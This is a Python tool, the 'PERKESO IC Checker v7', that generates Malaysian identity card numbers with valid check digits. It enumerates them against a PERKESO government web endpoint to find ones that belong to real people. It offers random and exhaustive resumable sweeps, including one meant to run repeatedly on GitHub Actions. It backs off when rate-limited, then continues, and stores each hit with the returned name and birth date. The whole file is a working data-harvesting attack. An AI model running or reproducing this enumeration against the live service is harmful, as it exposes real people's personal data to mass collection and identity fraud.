"""
PERKESO IC Checker  v7  — Dual Mode: Adaptive + Systematic A-Z
───────────────────────────────────────────────────────────────
Mode 1 — Adaptive Random (fast hit finder)
    Population-weighted, hot-DOB sweeping. Best for finding valid
    records quickly. Does NOT guarantee full coverage.

Mode 4 — Systematic A-Z Sweep (exhaustive coverage)
    Iterates every date × state × sequence in order. Saves a cursor
    to master_progress.json so each GitHub Actions run resumes exactly
    where the previous one stopped. Cycles back to start when done.

The two modes complement each other:
    Mode 4 for GitHub Actions (systematic, infinite, resumable)
    Mode 1 locally when you want quick hits

Master files
    master_valid.json    — permanent valid records
    master_invalid.json  — recent invalids with 30-day TTL (Mode 1 only)
    master_progress.json — systematic sweep cursor (Mode 4 only)

Usage
    python ic_checker.py                           # interactive menu
    python ic_checker.py --mode 4 --workers 3 --max-runtime 22   # CI/Actions
    python ic_checker.py --mode 1 --workers 3 --max-runtime 22   # adaptive
    python ic_checker.py --mode 2 --date 1985-04-27 --pb 10      # full DOB sweep
    python ic_checker.py --mode 3 --ics 610212075425,920913235001 # manual
"""

import argparse, random, json, os, time, signal, threading, queue, sys
from datetime import date, timedelta, datetime
from collections import deque

try:
    import requests
except ImportError:
    sys.exit("Run: pip install requests")

# ── Config ────────────────────────────────────────────────────────────────────
API_URL          = "https://lindungfaedah.perkeso.gov.my/auth/script/check_ic.php"
OUTPUT_DIR       = "ic_results"
VALID_FILE       = os.path.join(OUTPUT_DIR, "master_valid.json")
INVALID_FILE     = os.path.join(OUTPUT_DIR, "master_invalid.json")
PROGRESS_FILE    = os.path.join(OUTPUT_DIR, "master_progress.json")

INVALID_TTL_DAYS = 30
DELAY_MIN        = 1.5    # 3 workers × 1.5s = 2 req/s (safe for gov API)
DELAY_MAX        = 60.0   # max backoff
WORKERS_MAX      = 3
FLUSH_EVERY      = 25
STATS_EVERY      = 10

IS_CI = os.environ.get("GITHUB_ACTIONS") == "true"

# ── Region tables ─────────────────────────────────────────────────────────────
REGION_PRIMARY = {
    "01":"Johor",         "02":"Kedah",          "03":"Kelantan",
    "04":"Melaka",        "05":"Negeri Sembilan", "06":"Pahang",
    "07":"Pulau Pinang",  "08":"Perak",           "09":"Perlis",
    "10":"Selangor",      "11":"Terengganu",      "12":"Sabah",
    "13":"Sarawak",       "14":"WP Kuala Lumpur", "15":"WP Labuan",
    "16":"WP Putrajaya",
}
REGION_LEGACY = {}
for _s,_e,_r in [
    (21,24,"Johor"),(25,27,"Kedah"),(28,29,"Kelantan"),(30,30,"Melaka"),
    (31,31,"Negeri Sembilan"),(59,59,"Negeri Sembilan"),(32,33,"Pahang"),
    (34,35,"Pulau Pinang"),(36,39,"Perak"),(40,40,"Perlis"),(41,44,"Selangor"),
    (45,46,"Terengganu"),(47,49,"Sabah"),(50,53,"Sarawak"),(54,57,"Kuala Lumpur"),
    (58,58,"Labuan"),
]:
    for i in range(_s,_e+1): REGION_LEGACY[str(i).zfill(2)] = _r

MALAYSIAN_REGIONS = {**REGION_PRIMARY, **REGION_LEGACY}
WEIGHTS = [2,4,8,5,10,9,7,3,6,1,2]

# Sorted for systematic sweep
ORDERED_PBS = sorted(MALAYSIAN_REGIONS.keys(), key=int)

# Population-weighted pool for adaptive mode
STATE_POOL = (
    ["10"]*20 + ["14"]*18 + ["01"]*12 + ["07"]*10 + ["08"]*8 +
    ["12"]*7  + ["13"]*7  + ["03"]*4  + ["05"]*4  + ["06"]*4  +
    ["02"]*3  + ["04"]*2  + ["11"]*2  + ["09"]*1  + ["15"]*1  + ["16"]*1
)

def state_name(pb): return MALAYSIAN_REGIONS.get(pb, f"Unknown ({pb})")

# ── Checksum ──────────────────────────────────────────────────────────────────
def compute_check_digit(digits11):
    rev = digits11[::-1]
    return (12 - (sum(rev[j]*WEIGHTS[j] for j in range(11)) % 11)) % 11

def all_valid_sequences(yy, mm, dd, pb, year):
    seq_range = range(0,500) if year >= 2000 else range(500,1000)
    out = []
    for s in seq_range:
        s_str    = str(s).zfill(3)
        digits11 = [int(ch) for ch in (yy+mm+dd+pb+s_str)]
        c        = compute_check_digit(digits11)
        if c != 10: out.append((s, c))
    return out

def make_ic_record(yy, mm, dd, pb, year, seq, chk):
    s_str = str(seq).zfill(3)
    ic    = yy+mm+dd+pb+s_str+str(chk)
    today = date.today()
    try:
        dob   = date(year, int(mm), int(dd))
        age   = f"{today.year-dob.year-((today.month,today.day)<(dob.month,dob.day))}y"
    except: age = "?"
    return {
        "ic_number":     ic,
        "ic_formatted":  f"{yy}{mm}{dd}-{pb}-{s_str}{chk}",
        "date_of_birth": f"{year}-{mm}-{dd}",
        "age":           age,
        "pb_code":       pb,
        "pb_name":       state_name(pb),
        "sequence":      seq,
        "check_digit":   chk,
        "gender":        "Male" if chk%2==1 else "Female",
    }

def random_date(from_year=1965, to_year=2000):
    start = date(from_year, 1, 1)
    end   = date(to_year,  12, 31)
    d     = start + timedelta(days=random.randint(0, (end-start).days))
    return d.year, d.month, d.day

# ── API ───────────────────────────────────────────────────────────────────────
def check_perkeso(icno):
    resp = requests.get(API_URL, params={"icno": icno}, timeout=10)
    resp.raise_for_status()
    return resp.json()

# ── Rate Controller ───────────────────────────────────────────────────────────
class RateController:
    def __init__(self, workers):
        self.delay               = DELAY_MIN
        self.workers             = workers
        self._w                  = deque(maxlen=50)
        self._lock               = threading.Lock()
        self._rate_limited_until = 0

    def rate_limited(self, retry_after=60):
        with self._lock:
            self._rate_limited_until = time.time() + retry_after
            self.delay = min(self.delay * 2, DELAY_MAX)
        safe_print(f"\n  🚫 429 RATE LIMITED — pausing {retry_after}s\n")
        time.sleep(retry_after)

    def wait_if_limited(self):
        pause = self._rate_limited_until - time.time()
        if pause > 0: time.sleep(pause)

    def record(self, ok):
        with self._lock:
            self._w.append(ok)
            if len(self._w) < 10: return
            err = self._w.count(False) / len(self._w)
            if   err > 0.40: self.delay = min(self.delay * 2,   DELAY_MAX)
            elif err > 0.20: self.delay = min(self.delay + 3.0, DELAY_MAX)
            elif err > 0.05: self.delay = min(self.delay + 1.0, DELAY_MAX)
            elif err == 0 and len(self._w) == 50:
                self.delay = max(self.delay - 0.2, DELAY_MIN)

    def get_delay(self):
        with self._lock: return self.delay

    def summary(self):
        with self._lock:
            e   = self._w.count(False) if self._w else 0
            lim = max(0, self._rate_limited_until - time.time())
            s   = f"delay={self.delay:.1f}s  err={e}/{len(self._w)}"
            if lim > 0: s += f"  🚫 rate-limited ({lim:.0f}s left)"
            return s

# ══════════════════════════════════════════════════════════════════════════════
#  Persistent State (master_valid + master_invalid)
# ══════════════════════════════════════════════════════════════════════════════
class PersistentState:
    def __init__(self):
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        self._lock = threading.Lock()
        today      = date.today()
        cutoff     = today - timedelta(days=INVALID_TTL_DAYS)

        raw_valid          = self._load(VALID_FILE, [])
        self._valid_records: list = raw_valid
        self._valid_ics: set      = {r["ic_number"] for r in raw_valid}

        raw_invalid  = self._load(INVALID_FILE, [])
        live, expired = [], []
        for e in raw_invalid:
            try:
                if date.fromisoformat(e["t"]) >= cutoff: live.append(e)
                else: expired.append(e["ic"])
            except: pass

        self._invalid_live: list = live
        self._invalid_ics:  set  = {e["ic"] for e in live}
        self._invalid_buf:  list = []
        self._all_checked:  set  = self._valid_ics | self._invalid_ics

        self.expired_count  = len(expired)
        self.loaded_valid   = len(self._valid_ics)
        self.loaded_invalid = len(self._invalid_ics)

        if expired: self._write(INVALID_FILE, self._invalid_live)

    @property
    def valid_count(self):   return len(self._valid_ics)
    @property
    def invalid_count(self): return len(self._invalid_ics)
    @property
    def total_checked(self): return len(self._all_checked)

    def is_checked(self, ic):
        with self._lock: return ic in self._all_checked

    def add_valid(self, ic, generated, api_response, checked_at):
        with self._lock:
            if ic in self._valid_ics: return
            if ic in self._invalid_ics:
                self._invalid_ics.discard(ic)
                self._invalid_live = [e for e in self._invalid_live if e["ic"] != ic]
            record = {
                "ic_number":        ic,
                "ic_formatted":     generated.get("ic_formatted"),
                "date_of_birth":    generated.get("date_of_birth"),
                "age":              generated.get("age"),
                "pb_code":          generated.get("pb_code"),
                "pb_name":          generated.get("pb_name"),
                "gender":           generated.get("gender"),
                "sequence":         generated.get("sequence"),
                "check_digit":      generated.get("check_digit"),
                "perkeso_response": api_response,
                "checked_at":       checked_at,
            }
            self._valid_records.append(record)
            self._valid_ics.add(ic)
            self._all_checked.add(ic)
            self._write(VALID_FILE, self._valid_records)

    def add_invalid(self, ic):
        with self._lock:
            if ic in self._valid_ics: return
            today_str = date.today().isoformat()
            if ic in self._invalid_ics:
                for e in self._invalid_live:
                    if e["ic"] == ic: e["t"] = today_str; break
            else:
                self._invalid_live.append({"ic": ic, "t": today_str})
                self._invalid_ics.add(ic)
                self._all_checked.add(ic)
            self._invalid_buf.append(ic)
            if len(self._invalid_buf) >= FLUSH_EVERY:
                self._write(INVALID_FILE, self._invalid_live)
                self._invalid_buf.clear()

    def flush(self):
        with self._lock:
            if self._invalid_buf:
                self._write(INVALID_FILE, self._invalid_live)
                self._invalid_buf.clear()

    @staticmethod
    def _load(path, default):
        if os.path.exists(path) and os.path.getsize(path) > 2:
            try: return json.load(open(path, "r", encoding="utf-8"))
            except: pass
        return default

    @staticmethod
    def _write(path, data):
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        os.replace(tmp, path)

# ══════════════════════════════════════════════════════════════════════════════
#  Systematic Progress Cursor  (master_progress.json)
# ══════════════════════════════════════════════════════════════════════════════
def load_progress(from_year, to_year):
    """Load cursor or create fresh one if range changed."""
    if os.path.exists(PROGRESS_FILE) and os.path.getsize(PROGRESS_FILE) > 2:
        try:
            p = json.load(open(PROGRESS_FILE, "r", encoding="utf-8"))
            if p.get("from_year") == from_year and p.get("to_year") == to_year:
                return p
        except: pass
    return {
        "from_year":            from_year,
        "to_year":              to_year,
        "cursor_date":          f"{from_year}-01-01",
        "cursor_pb_idx":        0,
        "cursor_seq_idx":       0,
        "cycles_completed":     0,
        "dob_states_completed": 0,
        "total_ics_checked":    0,
        "started_at":           datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "updated_at":           datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

def write_progress(p):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    p["updated_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    tmp = PROGRESS_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(p, f, indent=2, default=str)
    os.replace(tmp, PROGRESS_FILE)

def all_dates_in_range(from_year, to_year):
    """All valid calendar dates in range, sorted oldest→newest."""
    out, d = [], date(from_year, 1, 1)
    end    = date(to_year, 12, 31)
    while d <= end:
        out.append(d)
        d += timedelta(days=1)
    return out

# ── Print lock ────────────────────────────────────────────────────────────────
_plock = threading.Lock()
def safe_print(*a, **kw):
    with _plock: print(*a, **kw)

# ── Core check (shared by all modes) ─────────────────────────────────────────
def do_check(gen, index, rate_ctrl, pstate, run_stats, store_invalid=True):
    rate_ctrl.wait_if_limited()
    d = rate_ctrl.get_delay()
    time.sleep(random.uniform(d, d * 1.3))

    icno = gen["ic_number"]
    now  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        api      = check_perkeso(icno)
        is_valid = api.get("akses") == 1
        rate_ctrl.record(True)
    except requests.exceptions.HTTPError as e:
        if e.response is not None and e.response.status_code == 429:
            rate_ctrl.rate_limited(int(e.response.headers.get("Retry-After", 60)))
        api, is_valid = {"error": str(e)}, None
        rate_ctrl.record(False)
    except requests.exceptions.RequestException as e:
        api, is_valid = {"error": str(e)}, None
        rate_ctrl.record(False)

    run_stats["checked"] += 1
    if is_valid is True:
        pstate.add_valid(icno, gen, api, now)
        run_stats["valid"] += 1
        rec = api["debug"]["data"][0]
        tag = f"✅  VALID   — {rec.get('name','N/A')}  DOB: {rec.get('dob','N/A')}"
    elif is_valid is False:
        if store_invalid: pstate.add_invalid(icno)
        run_stats["invalid"] += 1
        tag = "❌  INVALID"
    else:
        run_stats["errors"] += 1
        tag = f"⚠️   ERROR  — {api.get('error','?')}"

    c   = run_stats
    pct = c["valid"] / max(c["checked"], 1) * 100
    safe_print(f"  [{index}] {gen['ic_formatted']}  "
               f"({gen['date_of_birth']}, {gen['gender']}, {gen['pb_name']})")
    safe_print(f"        {tag}   ({c['valid']}/{c['checked']} {pct:.0f}%  "
               f"| all-time valid: {pstate.valid_count})")

    if c["checked"] % STATS_EVERY == 0:
        safe_print(f"\n{'─'*62}")
        safe_print(f"  {c['checked']} checked | ✅ {c['valid']} | ❌ {c['invalid']} | ⚠️  {c['errors']}")
        safe_print(f"  {rate_ctrl.summary()}")
        safe_print(f"{'─'*62}\n")

    return is_valid

# ══════════════════════════════════════════════════════════════════════════════
#  MODE 4 — Systematic A-Z Sweep
# ══════════════════════════════════════════════════════════════════════════════
def run_systematic(from_year, to_year, initial_workers, pstate, max_runtime=None):
    """
    Iterate every date × state × sequence in order.
    Saves cursor to master_progress.json after every 200 checks.
    Resumes precisely between GitHub Actions runs.
    Cycles back to start when fully done.

    Does NOT write to master_invalid.json — the cursor tracks what's
    been checked, keeping that file small for Mode 1 (adaptive) use.
    Valid hits are still saved permanently to master_valid.json.
    """
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    prog      = load_progress(from_year, to_year)
    all_dates = all_dates_in_range(from_year, to_year)

    # Restore cursor
    try:
        c_date_obj = date.fromisoformat(prog["cursor_date"])
        c_pb_idx   = int(prog.get("cursor_pb_idx",  0))
        c_seq_idx  = int(prog.get("cursor_seq_idx", 0))
        c_date_idx = next((i for i,d in enumerate(all_dates) if d >= c_date_obj), 0)
    except:
        c_date_idx = c_pb_idx = c_seq_idx = 0

    rate_ctrl  = RateController(initial_workers)
    run_stats  = {"checked":0, "valid":0, "invalid":0, "errors":0}
    shutdown   = threading.Event()
    task_q     = queue.Queue(maxsize=500)
    idx_lock   = threading.Lock()
    idx_cnt    = [0]
    start_time = time.time()
    deadline   = (start_time + max_runtime * 60) if max_runtime else None
    prog_lock  = threading.Lock()

    # Mutable cursor updated by producer
    cur = {
        "date_idx": c_date_idx,
        "pb_idx":   c_pb_idx,
        "seq_idx":  c_seq_idx,
        "dob_done": prog.get("dob_states_completed", 0),
    }

    total_slots = len(all_dates) * len(ORDERED_PBS)

    def next_idx():
        with idx_lock: idx_cnt[0] += 1; return idx_cnt[0]

    def should_stop():
        if shutdown.is_set(): return True
        if deadline and time.time() >= deadline: return True
        return False

    def flush_cursor():
        with prog_lock:
            d = all_dates[min(cur["date_idx"], len(all_dates)-1)]
            prog["cursor_date"]           = d.isoformat()
            prog["cursor_pb_idx"]         = cur["pb_idx"]
            prog["cursor_seq_idx"]        = cur["seq_idx"]
            prog["dob_states_completed"]  = cur["dob_done"]
            prog["total_ics_checked"]     = (prog.get("total_ics_checked", 0)
                                             + run_stats["checked"])
            write_progress(prog)

    def producer():
        flush_tick = 0
        pb_start_saved = c_pb_idx

        for d_idx in range(c_date_idx, len(all_dates)):
            if should_stop(): break
            d_obj = all_dates[d_idx]
            yy = str(d_obj.year % 100).zfill(2)
            mm = str(d_obj.month).zfill(2)
            dd = str(d_obj.day).zfill(2)

            # On first date of resume, start from saved pb_idx; else from 0
            pb_start = pb_start_saved if d_idx == c_date_idx else 0

            for pb_idx in range(pb_start, len(ORDERED_PBS)):
                if should_stop(): break
                pb    = ORDERED_PBS[pb_idx]
                cands = all_valid_sequences(yy, mm, dd, pb, d_obj.year)

                # On first pb of resume, start from saved seq_idx; else from 0
                seq_start = c_seq_idx if (d_idx == c_date_idx and pb_idx == c_pb_idx) else 0

                for seq_i, (seq, chk) in enumerate(cands):
                    if seq_i < seq_start: continue
                    if should_stop(): break

                    rec = make_ic_record(yy, mm, dd, pb, d_obj.year, seq, chk)

                    # Skip already-confirmed valid ICs only (not invalids —
                    # cursor handles that)
                    if rec["ic_number"] in pstate._valid_ics:
                        continue

                    try:
                        task_q.put(rec, timeout=5)
                    except queue.Full:
                        time.sleep(1)
                        task_q.put(rec, block=True)

                    flush_tick += 1
                    if flush_tick >= 200:
                        cur.update({"date_idx": d_idx,
                                    "pb_idx":   pb_idx,
                                    "seq_idx":  seq_i})
                        flush_cursor()
                        flush_tick = 0

                # DOB+state slot complete
                cur["dob_done"] += 1
                cur.update({"date_idx": d_idx, "pb_idx": pb_idx+1, "seq_idx": 0})

            pb_start_saved = 0  # only first date uses saved pb_idx

        # ── Full cycle done ────────────────────────────────────────────────
        if not should_stop():
            safe_print("\n\n  🎉 Full cycle done! Resetting cursor for next pass...\n")
            with prog_lock:
                prog.update({
                    "cursor_date":          f"{from_year}-01-01",
                    "cursor_pb_idx":        0,
                    "cursor_seq_idx":       0,
                    "dob_states_completed": 0,
                    "cycles_completed":     prog.get("cycles_completed", 0) + 1,
                })
                write_progress(prog)
        else:
            flush_cursor()

        task_q.put(None)

    def worker():
        while not should_stop():
            try: gen = task_q.get(timeout=2)
            except queue.Empty: continue
            if gen is None: task_q.put(None); break
            # store_invalid=False: cursor tracks position, keeps master_invalid small
            do_check(gen, next_idx(), rate_ctrl, pstate, run_stats,
                     store_invalid=False)
            task_q.task_done()

    def handle_stop(sig, frame):
        safe_print("\n\n  🛑  Stopping..."); shutdown.set()
    signal.signal(signal.SIGINT, handle_stop)

    dob_done_now = prog.get("dob_states_completed", 0)
    pct_done     = dob_done_now / total_slots * 100 if total_slots else 0
    cycle        = prog.get("cycles_completed", 0)

    print("=" * 62)
    print(f"  Systematic A-Z Sweep  — Mode 4")
    print(f"  Range: {from_year}–{to_year}  |  {total_slots:,} DOB+state slots")
    print(f"  Cycle: {cycle+1}  |  {dob_done_now:,}/{total_slots:,} slots done "
          f"({pct_done:.3f}%)")
    print(f"  Resuming: {prog['cursor_date']} · "
          f"[{ORDERED_PBS[min(c_pb_idx, len(ORDERED_PBS)-1)]}] "
          f"{state_name(ORDERED_PBS[min(c_pb_idx, len(ORDERED_PBS)-1)])}")
    print(f"  {initial_workers} workers · {DELAY_MIN}–{DELAY_MAX}s delay (auto)")
    print(f"  💾 Progress → {PROGRESS_FILE}")
    print("=" * 62 + "\n")

    prod    = threading.Thread(target=producer, daemon=True)
    workers = [threading.Thread(target=worker, daemon=True)
               for _ in range(initial_workers)]
    prod.start()
    for w in workers: w.start()

    try:
        while not should_stop(): time.sleep(0.5)
    except KeyboardInterrupt:
        shutdown.set()

    for w in workers: w.join(timeout=DELAY_MAX + 2)
    pstate.flush()

    c       = run_stats
    elapsed = int(time.time() - start_time)
    e_str   = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
    pct_now = prog.get("dob_states_completed", 0) / total_slots * 100

    print(f"\n{'='*62}")
    print(f"  Run done  |  {e_str}")
    print(f"  This run : {c['checked']} checked | ✅ {c['valid']} | ❌ {c['invalid']}")
    print(f"  All-time : {pstate.valid_count} valid  |  cycle {cycle+1}")
    print(f"  Coverage : {pct_now:.4f}% of {from_year}–{to_year} completed")
    print(f"{'='*62}")
    print(f"\n  💾 Valid    → {VALID_FILE}   ({pstate.valid_count} records)")
    print(f"  💾 Progress → {PROGRESS_FILE}  ({pct_now:.4f}% done)\n")

# ══════════════════════════════════════════════════════════════════════════════
#  MODE 1 — Adaptive Random (fast hit finder)
# ══════════════════════════════════════════════════════════════════════════════
def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None):
    rate_ctrl  = RateController(initial_workers)
    run_stats  = {"checked":0,"valid":0,"invalid":0,"errors":0}
    shutdown   = threading.Event()
    task_q     = queue.Queue(maxsize=300)
    hot_dobs   = deque()
    tried      = {}
    idx_lock   = threading.Lock()
    idx_cnt    = [0]
    start_time = time.time()
    deadline   = (start_time + max_runtime * 60) if max_runtime else None

    def next_idx():
        with idx_lock: idx_cnt[0] += 1; return idx_cnt[0]

    def should_stop():
        if shutdown.is_set(): return True
        if deadline and time.time() >= deadline: return True
        return False

    def enqueue_dob(year, month, day, pb, limit=None, shuffle=True):
        yy  = str(year%100).zfill(2)
        mm  = str(month).zfill(2)
        dd  = str(day).zfill(2)
        key = f"{yy}{mm}{dd}{pb}"
        done = tried.setdefault(key, set())
        cands = [c for c in all_valid_sequences(yy,mm,dd,pb,year) if c[0] not in done]
        if shuffle: random.shuffle(cands)
        added = 0
        for seq, chk in cands:
            if should_stop(): return
            if limit and added >= limit: break
            rec = make_ic_record(yy,mm,dd,pb,year,seq,chk)
            if pstate.is_checked(rec["ic_number"]): continue
            done.add(seq)
            try: task_q.put(rec, timeout=3); added += 1
            except queue.Full: break

    def producer():
        while not should_stop():
            if hot_dobs:
                yr,mo,dy,pb = hot_dobs.popleft()
                enqueue_dob(yr,mo,dy,pb, limit=20, shuffle=False)
            else:
                yr,mo,dy = random_date(from_year, to_year)
                pb = random.choice(STATE_POOL)
                enqueue_dob(yr,mo,dy,pb, limit=5)
        task_q.put(None)

    def worker():
        while not should_stop():
            try: gen = task_q.get(timeout=2)
            except queue.Empty: continue
            if gen is None: task_q.put(None); break
            result = do_check(gen, next_idx(), rate_ctrl, pstate, run_stats,
                              store_invalid=True)
            if result is True:
                p = gen["date_of_birth"].split("-")
                hot_dobs.append((int(p[0]),int(p[1]),int(p[2]),gen["pb_code"]))
            if should_stop(): shutdown.set()
            task_q.task_done()

    def handle_stop(sig, frame):
        safe_print("\n\n  🛑  Stopping..."); shutdown.set()
    signal.signal(signal.SIGINT, handle_stop)

    limit_lbl = f"max {max_runtime} min" if max_runtime else "infinite"
    print("=" * 62)
    print(f"  Adaptive Random  [{limit_lbl}]")
    print(f"  DOB {from_year}–{to_year}  |  {initial_workers} workers  |  "
          f"{DELAY_MIN}–{DELAY_MAX}s delay")
    print(f"  ⏭  Skipping {pstate.total_checked:,} known ICs")
    print("=" * 62 + "\n")

    prod    = threading.Thread(target=producer, daemon=True)
    workers = [threading.Thread(target=worker, daemon=True)
               for _ in range(initial_workers)]
    prod.start()
    for w in workers: w.start()

    try:
        while not should_stop(): time.sleep(0.5)
    except KeyboardInterrupt:
        shutdown.set()

    for w in workers: w.join(timeout=DELAY_MAX + 2)
    pstate.flush()

    c = run_stats
    print(f"\n{'='*62}")
    print(f"  Run done  |  {c['checked']} checked | ✅ {c['valid']} | "
          f"❌ {c['invalid']} | ⚠️  {c['errors']}")
    print(f"  All-time: {pstate.valid_count} valid | {pstate.invalid_count} invalid")
    print(f"{'='*62}\n")

# ══════════════════════════════════════════════════════════════════════════════
#  MODE 2 — Full DOB Sweep
# ══════════════════════════════════════════════════════════════════════════════
def run_full_sweep(year, month, day, pb, workers, pstate):
    yy,mm,dd = str(year%100).zfill(2), str(month).zfill(2), str(day).zfill(2)
    cands = all_valid_sequences(yy,mm,dd,pb,year)
    todo  = [make_ic_record(yy,mm,dd,pb,year,s,c)
             for s,c in cands if not pstate.is_checked(yy+mm+dd+pb+str(s).zfill(3)+str(c))]
    skip  = len(cands) - len(todo)
    rate_ctrl = RateController(workers)
    run_stats = {"checked":0,"valid":0,"invalid":0,"errors":0}
    shutdown  = threading.Event()

    def handle_stop(sig, frame): shutdown.set()
    signal.signal(signal.SIGINT, handle_stop)

    eta = len(todo)*((DELAY_MIN+DELAY_MAX)/2)/workers/60
    print("=" * 62)
    print(f"  Full DOB Sweep — {year}-{mm}-{dd}  [{pb}] {state_name(pb)}")
    print(f"  {len(todo)} to check  |  {skip} skipped  |  ETA ~{eta:.0f} min")
    print("=" * 62 + "\n")

    task_q = queue.Queue()
    for i,gen in enumerate(todo): task_q.put((i+1,gen))

    def worker():
        while not shutdown.is_set():
            try: idx,gen = task_q.get_nowait()
            except queue.Empty: break
            do_check(gen,idx,rate_ctrl,pstate,run_stats, store_invalid=True)
            task_q.task_done()

    threads = [threading.Thread(target=worker) for _ in range(workers)]
    for t in threads: t.start()
    for t in threads: t.join()
    pstate.flush()

    c = run_stats
    print(f"\n  Done  |  {c['checked']} checked  |  ✅ {c['valid']}  |  ❌ {c['invalid']}\n")

# ══════════════════════════════════════════════════════════════════════════════
#  MODE 3 — Manual
# ══════════════════════════════════════════════════════════════════════════════
def run_manual(ic_list, workers, pstate):
    rate_ctrl = RateController(workers)
    run_stats = {"checked":0,"valid":0,"invalid":0,"errors":0}
    todo = []

    for icno in ic_list:
        icno = icno.strip()
        if not icno.isdigit() or len(icno) != 12:
            print(f"  ⚠️  SKIPPED {icno!r}"); continue
        if pstate.is_checked(icno):
            print(f"  ⏭   SKIP {icno} — already known"); continue
        pb = icno[6:8]
        todo.append({
            "ic_number":    icno,
            "ic_formatted": f"{icno[:6]}-{pb}-{icno[8:]}",
            "date_of_birth": f"{icno[:2]}/{icno[2:4]}/{icno[4:6]}",
            "age":"N/A","pb_code":pb,"pb_name":state_name(pb),
            "sequence":int(icno[8:11]),"check_digit":int(icno[11]),
            "gender":"Male" if int(icno[11])%2==1 else "Female",
        })

    print("=" * 62)
    print(f"  Manual — {len(todo)} to check  |  {workers} workers")
    print("=" * 62 + "\n")

    task_q = queue.Queue()
    for i,gen in enumerate(todo): task_q.put((i+1,gen))

    def worker():
        while True:
            try: idx,gen = task_q.get_nowait()
            except queue.Empty: break
            do_check(gen,idx,rate_ctrl,pstate,run_stats, store_invalid=True)
            task_q.task_done()

    threads = [threading.Thread(target=worker) for _ in range(workers)]
    for t in threads: t.start()
    for t in threads: t.join()
    pstate.flush()

    c = run_stats
    print(f"\n  Done  |  {c['checked']} checked  |  ✅ {c['valid']}  |  ❌ {c['invalid']}\n")

# ══════════════════════════════════════════════════════════════════════════════
#  CLI + Entry point
# ══════════════════════════════════════════════════════════════════════════════
def parse_args():
    p = argparse.ArgumentParser(description="PERKESO IC Checker v7")
    p.add_argument("--mode",        type=int, choices=[1,2,3,4], default=None)
    p.add_argument("--workers",     type=int, default=2 if IS_CI else 3)
    p.add_argument("--from-year",   type=int, default=1965, dest="from_year")
    p.add_argument("--to-year",     type=int, default=2000, dest="to_year")
    p.add_argument("--max-runtime", type=int, default=None, dest="max_runtime")
    p.add_argument("--date",        type=str, default=None)
    p.add_argument("--pb",          type=str, default="10")
    p.add_argument("--ics",         type=str, default=None)
    p.add_argument("--ttl",         type=int, default=INVALID_TTL_DAYS)
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    INVALID_TTL_DAYS = args.ttl

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    print(f"\n  Loading state...")
    st = PersistentState()
    print(f"  ✅ {st.loaded_valid:,} valid (permanent)")
    print(f"  ❌ {st.loaded_invalid:,} invalid (TTL {args.ttl}d)")
    if st.expired_count:
        print(f"  🔄 {st.expired_count} expired entries cleared")
    print()

    workers = max(1, min(args.workers, WORKERS_MAX))

    if args.mode is not None:
        if args.mode == 4:
            run_systematic(args.from_year, args.to_year, workers, st,
                           max_runtime=args.max_runtime)
        elif args.mode == 1:
            run_adaptive(args.from_year, args.to_year, workers, st,
                         max_runtime=args.max_runtime)
        elif args.mode == 2:
            if args.date:
                try: yr,mo,dy = [int(x) for x in args.date.split("-")]
                except ValueError: sys.exit(f"Bad --date: {args.date}")
            else: yr,mo,dy = random_date(args.from_year, args.to_year)
            pb = args.pb.zfill(2) if args.pb.zfill(2) in MALAYSIAN_REGIONS else "10"
            run_full_sweep(yr,mo,dy,pb,workers,st)
        elif args.mode == 3:
            if not args.ics: sys.exit("--ics required for mode 3")
            run_manual([x.strip() for x in args.ics.split(",")], workers, st)
    else:
        print("=" * 62)
        print("  PERKESO IC Checker  v7")
        print("=" * 62)
        print("\n  [1]  Adaptive Random  (fast hit finder, hot-DOB sweeping)")
        print("  [2]  Full DOB Sweep  (all seqs for one date+state)")
        print("  [3]  Manual  (paste ICs directly)")
        print("  [4]  Systematic A-Z  (exhaustive, resumable, recommended)")

        mode = input("\n  Choice [1/2/3/4, default=1]: ").strip() or "1"
        try:
            workers = int(input("  Workers [default=3, max=3]: ").strip() or "3")
            workers = max(1, min(workers, WORKERS_MAX))
        except ValueError: workers = 3

        try:
            from_y = int(input("  Birth year from [default=1965]: ").strip() or "1965")
            to_y   = int(input("  Birth year to   [default=2000]: ").strip() or "2000")
        except ValueError: from_y, to_y = 1965, 2000

        if mode == "4":
            run_systematic(from_y, to_y, workers, st)
        elif mode == "1":
            run_adaptive(from_y, to_y, workers, st)
        elif mode == "2":
            dob_in = input("\n  Date (YYYY-MM-DD) or Enter for random: ").strip()
            if dob_in:
                try: yr,mo,dy = [int(x) for x in dob_in.split("-")]
                except ValueError: yr,mo,dy = random_date()
            else: yr,mo,dy = random_date()
            print("  10=Selangor  14=WP KL  01=Johor  07=Penang  08=Perak")
            pb = input("  State code [default=10]: ").strip().zfill(2) or "10"
            if pb not in MALAYSIAN_REGIONS: pb = "10"
            run_full_sweep(yr,mo,dy,pb,workers,st)
        elif mode == "3":
            raw = input("\n  IC numbers (comma-separated):\n  > ").strip()
            ic_list = [x.strip() for x in raw.split(",") if x.strip()]
            if ic_list: run_manual(ic_list,workers,st)
